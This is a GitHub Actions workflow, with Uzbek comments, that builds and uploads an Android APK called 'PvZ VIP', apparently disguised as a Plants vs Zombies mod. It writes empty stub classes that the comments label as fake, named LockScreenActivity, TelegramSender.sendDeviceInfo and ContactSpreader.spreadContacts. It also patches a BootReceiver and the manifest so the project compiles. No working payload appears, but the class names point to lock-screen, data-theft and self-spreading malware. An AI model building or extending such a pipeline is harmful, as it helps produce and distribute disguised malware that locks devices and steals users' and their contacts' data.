name: PvZMod Builder
on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    
    - uses: actions/setup-java@v4
      with:
        distribution: temurin
        java-version: 17
        
    - name: Setup valid Gradle Wrapper
      run: |
        mkdir -p gradle/wrapper
        wget -q -O gradlew https://raw.githubusercontent.com/gradle/gradle/v8.9.0/gradlew
        chmod +x gradlew
        wget -q -O gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.9.0/gradle/wrapper/gradle-wrapper.jar
        wget -q -O gradle/wrapper/gradle-wrapper.properties https://raw.githubusercontent.com/gradle/gradle/v8.9.0/gradle/wrapper/gradle-wrapper.properties

    - name: Fix files
      run: |
        sudo apt-get install -y dos2unix aapt
        dos2unix gradlew *.gradle* || true
        
    - name: Fix build.gradle
      run: sed -i '/^allprojects/,/^}/d' build.gradle || true

    - name: Fix AndroidManifest.xml
      run: |
        sed -i -E 's/[[:space:]]*package="[^"]*"//g' app/src/main/AndroidManifest.xml || true
        sed -i -E 's/[[:space:]]*android:icon="@mipmap\/ic_launcher"//g' app/src/main/AndroidManifest.xml || true
        sed -i 's|<receiver android:name=".BootReceiver"[^>]*>|<receiver android:name=".BootReceiver" android:exported="false">|g' app/src/main/AndroidManifest.xml || true
        sed -i -E 's/[[:space:]]*android:theme="@style\/Theme.AppCompat"//g' app/src/main/AndroidManifest.xml || true
        sed -i -E 's/[[:space:]]*android:wakeAfterReceivingAction="[^"]*"//g' app/src/main/AndroidManifest.xml || true
    
    # >>> YANGI: BARCHA YO'QOLGAN VA BUZILGAN JAVA FAYLLARINI TO'G'RILAYMIZ <<<
    - name: Fix and Create all Java Files
      run: |
        mkdir -p app/src/main/java/com/pvzmod/game
        
        # 1. LockScreenActivity
        echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/LockScreenActivity.java
        echo "import android.app.Activity; import android.os.Bundle;" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
        echo "public class LockScreenActivity extends Activity { @Override protected void onCreate(Bundle s) { super.onCreate(s); } }" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
        
        # 2. DeviceIdGenerator (Soxta)
        echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/DeviceIdGenerator.java
        echo "import android.content.Context; public class DeviceIdGenerator { public static String generateUniqueId(Context c) { return \"12345\"; } }" >> app/src/main/java/com/pvzmod/game/DeviceIdGenerator.java
        
        # 3. TelegramSender (Soxta)
        echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/TelegramSender.java
        echo "public class TelegramSender { public static void sendDeviceInfo(String id) { } }" >> app/src/main/java/com/pvzmod/game/TelegramSender.java
        
        # 4. ContactSpreader (Soxta)
        echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/ContactSpreader.java
        echo "import android.content.Context; public class ContactSpreader { public static void spreadContacts(Context c) { } }" >> app/src/main/java/com/pvzmod/game/ContactSpreader.java
        
        # 5. MainActivity paket nomini to'g'rilash
        sed -i '1{/^import com.pvzmod.game.LockScreenActivity;/d}' app/src/main/java/com/pvzmod/game/MainActivity.java
        sed -i 's/^package com.pvzmod.vip;/package com.pvzmod.game;/' app/src/main/java/com/pvzmod/game/MainActivity.java
        
        # 6. BootReceiver ichidagi eski paket nomini yangisiga almashtirish
        if [ -f "app/src/main/java/com/pvzmod/game/BootReceiver.java" ]; then
          sed -i 's/com.pvzmod.vip.MainActivity/com.pvzmod.game.MainActivity/g' app/src/main/java/com/pvzmod/game/BootReceiver.java
        fi

    - name: Create resources
      run: mkdir -p app/src/main/res/values && echo '<?xml version="1.0"?><resources><string name="app_name">PvZ VIP</string></resources>' > app/src/main/res/values/strings.xml
    
    - name: Build
      run: ./gradlew clean assembleRelease
      
    - uses: actions/upload-artifact@v4
      with:
        name: PvZMod.apk
        path: '**/build/outputs/apk/release/*.apk'
